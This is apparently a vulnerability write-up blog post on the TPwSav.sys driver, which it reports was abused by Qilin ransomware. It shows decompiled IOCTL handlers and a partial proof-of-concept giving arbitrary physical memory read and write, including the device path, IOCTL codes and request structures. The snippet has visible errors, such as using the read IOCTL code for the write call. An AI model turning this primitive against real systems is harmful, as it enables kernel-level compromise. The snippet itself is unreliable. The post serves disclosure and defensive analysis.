---
layout: post
title:  "Vulnerability - TPwSav.sys Driver - Arbitrary Physical Memory Read and Write Primitive"
date:   2025-07-30 06:00:00 +0800
---

# Vulnerability - TPwSav.sys Driver - Arbitrary Physical Memory Read and Write Primitive

**Vulnerability Type:** Direct Physical Memory Access

**Sample:** https://www.loldrivers.io/drivers/c0634ed7-840e-4a7e-8b34-33efe50405c2/

**Quick summary:** Original blog by Blackpoint. ITW exploited by Qilin Ransomware gang utilizing the BYOVD, TPwSav.sys driver.

**Blackpoint blog:** https://blackpointcyber.com/blog/qilin-ransomware-and-the-hidden-dangers-of-byovd/

---
### Vulnerability Analysis

#### IOCTL - 0x2220C8 (Read Access)
This function provides a direct arbitrary physical memory read primitive to any user-mode application. The function takes user input containing (8-bytes) physical address then it maps that physical address using **MmMapIoSpace()** API. We can see from the code above it reads 1-byte from the mapped physical memory, `(puVar1 + 1)`. Then it returns the byte to the user (you can read it back from the mapped memory). Decompile code for function FUN_140002de0:
```c

undefined8 FUN_140002de0(longlong param_1)
{
  undefined8 *puVar1;
  undefined *puVar2;
  undefined8 uVar3;
  
  puVar1 = *(undefined8 **)(param_1 + 0x18);      // User buffer pointer
  puVar2 = (undefined *)MmMapIoSpace(*puVar1,1);  // Map physical address, our buffer pointer
  if (puVar2 == (undefined *)0x0) {
    uVar3 = 0xc0000001; 
  }
  else {
    *(undefined *)(puVar1 + 1) = *puVar2;         // Reading bytes and return back to user
    MmUnmapIoSpace(puVar2,1);
    *(undefined8 *)(param_1 + 0x38) = 0xc;
    uVar3 = 0;
  }
  return uVar3;
}
```

#### IOCTL - 0x2220CC (Write Access)
This function provides a direct arbitrary physical memory write primitive to any user-mode application. It allows user input to map their input to write into physical memory which 8 bytes from the buffer start. Similar to Read IOCTL, it uses **MmMapIoSpace()** API. The pointer to `*puVar2` allows user to control their input from the user buffer (from IRP). As you can see in the decompile code, it allows 1-byte write into the physical memory. This means it allows low privilege user to mapped their shellcode and perform further exploitation. Decompile code for function FUN_140002e80:
```c
undefined8 FUN_140002e80(longlong param_1)
{
  undefined8 *puVar1;
  undefined *puVar2;
  undefined8 uVar3;
  
  puVar1 = *(undefined8 **)(param_1 + 0x18);          // User buffer pointer
  puVar2 = (undefined *)MmMapIoSpace(*puVar1,1);      // Map physical address, our buffer pointer
  if (puVar2 == (undefined *)0x0) {
    uVar3 = 0xc0000001;
  }
  else {
    *puVar2 = *(undefined *)(puVar1 + 1);             // puVar2 accepts user input to write data to physical memory
    LOCK();
    MmUnmapIoSpace(puVar2,1);
    *(undefined8 *)(param_1 + 0x38) = 0;
    uVar3 = 0;
  }
  return uVar3;
}
```


### Proof of Concept

I crafted a proof of concept for this vulnerability by chaining both read and write of the IOCTL 0x2220CC and 0x2220C8 which allows me to read from and write into physical memory. Here is the example snippet code of arbitrary physical memory read and write primitive (you should get the entire idea from this):
```c
// device driver
#define DEVICE_DRIVER L"\\\\.\\EBIoDispatch"

// structure for read access
typedef struct _PHYSICAL_READ_REQUEST {
    PHYSICAL_ADDRESS PhysicalAddr;
    BYTE ReadValue;
    BYTE Reserved[3];
} PHYSICAL_READ_REQUEST, * PPHYSICAL_READ_REQUEST;

// structure for write access
typedef struct _PHYSICAL_WRITE_REQUEST {
    PHYSICAL_ADDRESS PhysicalAddr;     
    BYTE WriteValue;                   
    BYTE Reserved[3];                  
} PHYSICAL_WRITE_REQUEST, *PPHYSICAL_WRITE_REQUEST;

// handle for device driver
HANDLE hDevice = hDevice = CreateFileW(DEVICE_DRIVER, ...);

// example set variable for our physical memory
int phyMemAddr = 0x1000000;

// initialize read
PHYSICAL_READ_REQUEST readReq = {0};
readReq.PhysicalAddr = phyMemAddr;

// initialize write
PHYSICAL_WRITE_REQUEST request = { 0 };
request.PhysicalAddr = phyMemAddr;
request.WriteValue = 0xff;

// send request IOCTL for read
DeviceIoControl(hDevice, 0x2220C8, ...);
printf("Reading byte from address 0x%llx = 0x%02x\n", readReq.PhysicalAddr, readReq.ReadValue);

// send request IOCTL for write
DeviceIoControl(hDevice, 0x2220C8, ...);
printf("Writing byte to address 0x%llx = 0x%02x\n", request.PhysicalAddr, request.WriteValue);
```

Following are the example working proof of concept (physical read and write primitives):
![1](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/1.png)



